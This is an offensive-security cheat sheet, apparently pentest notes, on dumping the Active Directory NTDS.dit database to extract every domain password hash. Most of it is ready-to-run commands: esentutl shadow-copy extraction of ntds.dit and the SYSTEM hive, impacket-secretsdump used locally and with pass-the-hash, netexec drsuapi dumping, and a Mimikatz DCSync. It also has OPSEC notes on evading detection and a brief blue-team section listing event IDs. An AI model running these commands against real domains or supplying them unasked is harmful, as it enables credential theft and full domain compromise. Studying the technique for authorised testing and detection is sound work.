# NTDS Dumping

## 🔹 Overview

Dumping the NTDS database is one of the most powerful Active Directory attack techniques. It allows an attacker to extract **all domain user credentials** from a Domain Controller.

The main target is:

* **NTDS.dit** → Active Directory database file containing user credentials

---

## 🔹 What is NTDS?

**NTDS (NT Directory Services)** is the database used by Active Directory Domain Controllers to store:

* User accounts
* Password hashes (NTLM)
* Group memberships
* Domain objects

📍 Default location:

```id="ntds_loc_1"
C:\Windows\NTDS\ntds.dit
```

###  Key Points:

* Contains **all domain user password hashes**
* Protected and locked while the system is running
* Requires SYSTEM-level access or domain replication privileges
* Used for:

  * Pass-the-Hash
  * Lateral movement
  * Full domain compromise

---

## 🔹 SYSTEM Hive Requirement

To decrypt NTDS data, the **SYSTEM hive** is required:

```id="ntds_sys_1"
C:\Windows\System32\config\SYSTEM
```

👉 This contains the boot key used to decrypt the NTDS database.

---

# 🔹 Dump NTDS Locally

---

##  Exfiltrate NTDS and SYSTEM Hive

```bash id="ntds_exfil_1"
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\windows\temp\ntds.save
esentutl.exe /y /vss c:\windows\system32\config\SYSTEM /d c:\windows\temp\system.save
```

---

##  Dump NTDS with impacket-secretsdump

```bash id="ntds_local_dump_1"
$ impacket-secretsdump -ntds ntds.save -system system.save local
```

---

# 🔹 Dump NTDS Remotely with impacket-secretsdump

```bash id="ntds_remote_1"
$ impacket-secretsdump domain/administrator@DC-FQDN -hashes Hash:Hash -target-ip DC-IP -outputfile hash_dumps.txt
```

---

# 🔹 Dump NTDS Remotely with netexec

```bash id="ntds_netexec_1"
$ netexec smb DC-IP -u 'administrator' -H Hash --ntds drsuapi
```

---

# 🔹 Dump NTDS Remotely with Mimikatz (DCSync)

**Mimikatz** can perform a DCSync attack, which simulates a Domain Controller and requests password hashes via replication.

```bash id="ntds_mimikatz_1"
mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::dcsync /domain:domain /user:domain\administrator
```

---

## 🔹 What is DCSync?

DCSync abuses Active Directory replication to request credentials from a Domain Controller.

###  Key Requirements:

* Replication privileges (e.g., Domain Admin or equivalent rights)

---

# 🔹 Attack Value

Dumping NTDS provides:

*  All domain user NTLM hashes
*  Full domain compromise potential
*  Lateral movement across the network
*  Offline password cracking

---

# 🔹 Detection & Defense (Blue Team Insight)

###  Windows / Domain Controller Logs:

* Event ID **4662** → Directory Service Access (replication rights)
* Event ID **4624** → Successful logon
* Event ID **4672** → Privileged logon

### DCSync Detection Indicators:

* Replication requests from non-DC machines
* Unusual access to directory replication objects
* Accounts requesting directory replication without being DCs

---

# 🔹 OPSEC Notes

* NTDS dumping is **highly sensitive and noisy**
* Remote dumping may trigger:

  * EDR alerts
  * Suspicious replication activity
* DCSync is stealthier than file-based dumping but still detectable via:

  * Directory Service Access auditing
  * Replication privilege monitoring

---

# 🔹 Summary

* **NTDS.dit** = Active Directory database containing all domain credentials
* Requires **SYSTEM hive** for decryption
* Can be dumped:

  * Locally (file-based extraction)
  * Remotely (SMB / replication / DCSync)

Successfully dumping NTDS typically results in **full domain compromise**.

---
